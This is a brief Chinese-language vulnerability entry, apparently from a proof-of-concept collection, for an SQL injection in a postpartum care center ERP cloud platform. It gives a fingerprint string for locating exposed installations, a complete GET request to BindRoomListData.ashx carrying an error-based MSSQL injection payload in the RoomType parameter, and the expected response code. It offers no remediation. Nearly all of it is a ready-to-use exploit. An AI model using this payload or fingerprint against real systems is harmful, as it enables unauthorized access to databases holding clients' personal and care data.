# 月子会所ERP管理云平台BindRoomListData存在SQL注入漏洞

月子会所ERP管理云平台 ｜ SQL注入 ｜ —
- **指纹**：`body="月子护理ERP管理平台"`
- **请求**：`GET /Page/SalerManager/ashx/BindRoomListData.ashx?RZParam=1&RoomID=1&RoomName=1&RoomStyle=1&RoomType=1'%20and%201%3dconvert(int,@@version)--&ddlFStoreID=1&IsShowCount=1 HTTP/1.1`
- **响应特征**：200